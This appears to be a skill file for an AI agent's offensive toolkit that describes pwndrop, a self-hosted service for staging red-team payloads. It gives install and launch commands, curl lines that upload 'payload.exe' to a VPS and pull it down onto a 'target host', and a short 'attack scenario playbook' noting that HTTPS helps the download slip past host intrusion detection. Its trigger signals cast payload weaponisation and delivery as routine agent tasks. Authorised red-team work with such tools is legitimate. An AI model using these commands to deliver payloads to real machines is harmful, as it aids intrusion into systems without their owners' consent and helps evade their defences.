---
name: pwndrop-file-drop
description: "pwndrop: Hosts red-team payloads. Signals: payload development, weaponization, start delivery service, upload, target download."
zh-signals: "pwndrop: 红队载荷托管。信号:载荷开发,武器化,启动投递服务,上传,目标机下载。"
when-to-use: "Use when hosting red-team payloads for target download over HTTPS without relying on a temporary python http.server. Requires a reachable server or VPS and the payload files to upload."
---

# pwndrop

- Attack Category: C07 Payload and File Delivery
- Upstream Repository: https://github.com/kgretzky/pwndrop
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/kgretzky/pwndrop && cd pwndrop && make
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./pwndrop -s 0.0.0.0:443 -d files/` | Start the delivery service |
| `curl -F 'file=@payload.exe' https://vps:443/upload` | Upload |
| `curl -L -o file 'https://vps:443/shared/file'` | Download on the target host |
| `--no-web` | CLI only |

## Attack Scenario Playbook

### Red-team payload hosting

```bash
./pwndrop -s 0.0.0.0:443
# Target pulls the payload with curl/Invoke-WebRequest; HTTPS reduces HIDS signatures
```

## Notes

Self-hosted file delivery service by kgretzky, with web management, short links and HTTPS, replacing a temporary python http.server.
